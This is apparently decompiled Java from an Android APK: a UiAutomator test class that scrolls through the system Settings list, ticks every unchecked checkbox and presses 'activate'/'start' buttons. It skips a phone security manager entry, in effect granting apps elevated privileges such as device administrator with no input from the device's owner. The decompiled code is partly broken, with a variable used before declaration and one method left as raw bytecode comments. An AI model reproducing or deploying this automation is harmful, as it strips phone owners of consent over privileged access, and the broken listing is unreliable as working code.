package run;

import android.os.RemoteException;
import android.os.SystemClock;
import android.util.Log;
import com.android.uiautomator.core.UiDevice;
import com.android.uiautomator.core.UiObject;
import com.android.uiautomator.core.UiObjectNotFoundException;
import com.android.uiautomator.core.UiSelector;
import com.android.uiautomator.testrunner.UiAutomatorTestCase;
import java.io.PrintStream;

public class RunRegister extends UiAutomatorTestCase
{
  static final int settings = 4;
  int click_checkbox = 0;
  String[] click_state = { "android.widget.CheckBox", "android.widget.TextView" };
  int click_textview = 1;
  int correnttste = 4;
  int height = 0;
  int index = 0;
  int swipe_type = 0;
  int width = 0;

  private void loop()
  {
    while (true)
    {
      try
      {
        UiObject localUiObject1 = new UiObject(new UiSelector().packageName("com.android.settings").className("android.widget.ListView"));
        if (!localUiObject1.waitForExists(10000L))
          return;
        int i = localUiObject1.getChildCount();
        if (this.swipe_type != 1)
          break label284;
        swipe();
        break label284;
        if (j < i)
        {
          wakeUp();
          UiObject localUiObject2 = localUiObject1.getChild(new UiSelector().packageName("com.android.settings").index(j));
          if (localUiObject2.exists())
          {
            if (localUiObject2.getChild(new UiSelector().packageName("com.android.settings").className("android.widget.TextView").textContains("手机管家")).exists())
            {
              SystemClock.sleep(1000L);
              break label290;
            }
            UiObject localUiObject3 = localUiObject2.getChild(new UiSelector().packageName("com.android.settings").className("android.widget.CheckBox"));
            if ((localUiObject3.exists()) && (!localUiObject3.isChecked()))
            {
              localUiObject3.click();
              clickActivation();
            }
            UiObject localUiObject4 = localUiObject2.getChild(new UiSelector().packageName("com.android.settings").className("android.widget.TextView"));
            if ((localUiObject4.exists()) && (localUiObject4.isCheckable()))
            {
              localUiObject4.click();
              clickActivation();
            }
          }
          if (j != i - 1)
            break label290;
          swipe();
        }
      }
      catch (Exception localException)
      {
        System.out.println("09：" + localException.toString());
      }
      return;
      label284: int j = 0;
      continue;
      label290: j++;
    }
  }

  private void loopsettings()
  {
    this.width = getUiDevice().getDisplayWidth();
    this.height = getUiDevice().getDisplayHeight();
    while (this.index <= 20)
      loop();
    write2sdcard("OK\r\n");
  }

  private void wakeUp()
  {
    try
    {
      UiDevice.getInstance().wakeUp();
      return;
    }
    catch (RemoteException localRemoteException)
    {
      localRemoteException.printStackTrace();
    }
  }

  // ERROR //
  private void write2sdcard(String paramString)
  {
    // Byte code:
    //   0: new 175	java/io/File
    //   3: dup
    //   4: ldc 177
    //   6: invokespecial 179	java/io/File:<init>	(Ljava/lang/String;)V
    //   9: astore_2
    //   10: aload_2
    //   11: invokevirtual 180	java/io/File:exists	()Z
    //   14: ifne +8 -> 22
    //   17: aload_2
    //   18: invokevirtual 183	java/io/File:mkdirs	()Z
    //   21: pop
    //   22: new 175	java/io/File
    //   25: dup
    //   26: new 124	java/lang/StringBuilder
    //   29: dup
    //   30: invokespecial 125	java/lang/StringBuilder:<init>	()V
    //   33: ldc 177
    //   35: invokevirtual 131	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   38: ldc 185
    //   40: invokevirtual 131	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   43: invokevirtual 136	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   46: invokespecial 179	java/io/File:<init>	(Ljava/lang/String;)V
    //   49: astore_3
    //   50: aload_3
    //   51: invokevirtual 180	java/io/File:exists	()Z
    //   54: ifne +8 -> 62
    //   57: aload_3
    //   58: invokevirtual 188	java/io/File:createNewFile	()Z
    //   61: pop
    //   62: aconst_null
    //   63: astore 4
    //   65: new 190	java/io/FileWriter
    //   68: dup
    //   69: aload_3
    //   70: iconst_1
    //   71: invokespecial 193	java/io/FileWriter:<init>	(Ljava/io/File;Z)V
    //   74: astore 5
    //   76: aload 5
    //   78: aload_1
    //   79: invokevirtual 196	java/io/FileWriter:write	(Ljava/lang/String;)V
    //   82: aload 5
    //   84: ifnull +8 -> 92
    //   87: aload 5
    //   89: invokevirtual 199	java/io/FileWriter:close	()V
    //   92: getstatic 122	java/lang/System:out	Ljava/io/PrintStream;
    //   95: ldc 201
    //   97: invokevirtual 142	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   100: return
    //   101: astore 11
    //   103: aload 11
    //   105: invokevirtual 202	java/io/IOException:printStackTrace	()V
    //   108: goto -46 -> 62
    //   111: astore 10
    //   113: aload 10
    //   115: invokevirtual 202	java/io/IOException:printStackTrace	()V
    //   118: goto -26 -> 92
    //   121: astore 6
    //   123: aload 6
    //   125: invokevirtual 202	java/io/IOException:printStackTrace	()V
    //   128: aload 4
    //   130: ifnull -38 -> 92
    //   133: aload 4
    //   135: invokevirtual 199	java/io/FileWriter:close	()V
    //   138: goto -46 -> 92
    //   141: astore 9
    //   143: aload 9
    //   145: invokevirtual 202	java/io/IOException:printStackTrace	()V
    //   148: goto -56 -> 92
    //   151: astore 7
    //   153: aload 4
    //   155: ifnull +8 -> 163
    //   158: aload 4
    //   160: invokevirtual 199	java/io/FileWriter:close	()V
    //   163: aload 7
    //   165: athrow
    //   166: astore 8
    //   168: aload 8
    //   170: invokevirtual 202	java/io/IOException:printStackTrace	()V
    //   173: goto -10 -> 163
    //   176: astore 7
    //   178: aload 5
    //   180: astore 4
    //   182: goto -29 -> 153
    //   185: astore 6
    //   187: aload 5
    //   189: astore 4
    //   191: goto -68 -> 123
    //
    // Exception table:
    //   from	to	target	type
    //   57	62	101	java/io/IOException
    //   87	92	111	java/io/IOException
    //   65	76	121	java/io/IOException
    //   133	138	141	java/io/IOException
    //   65	76	151	finally
    //   123	128	151	finally
    //   158	163	166	java/io/IOException
    //   76	82	176	finally
    //   76	82	185	java/io/IOException
  }

  public void clickActivation()
  {
    try
    {
      UiObject localUiObject1 = new UiObject(new UiSelector().packageName("com.android.settings").className("android.widget.Button").text("激活"));
      if (localUiObject1.exists())
      {
        localUiObject1.click();
        return;
      }
      UiObject localUiObject2 = new UiObject(new UiSelector().packageName("com.android.settings").className("android.widget.Button").text("启动"));
      if (localUiObject2.exists())
      {
        localUiObject2.click();
        return;
      }
    }
    catch (Exception localException)
    {
      Log.e("wyy", "--06:" + localException.toString());
      return;
    }
    if (new UiObject(new UiSelector().packageName("com.android.settings").className("android.widget.Button").text("取消激活")).exists())
    {
      System.out.println("just quxiao");
      getUiDevice().pressBack();
    }
  }

  public void swipe()
  {
    getUiDevice().swipe(this.width / 2, 3 * this.height / 4, this.width / 2, this.height / 4, this.height / 4 / 10);
  }

  public void testDemo()
    throws UiObjectNotFoundException
  {
    System.out.println("------------RunRegister------");
    switch (this.correnttste)
    {
    default:
      return;
    case 4:
    }
    loopsettings();
  }
}

/* Location:           C:\Users\Tato\Desktop\uiclick\classes_dex2jar.jar
 * Qualified Name:     run.RunRegister
 * JD-Core Version:    0.6.2
 */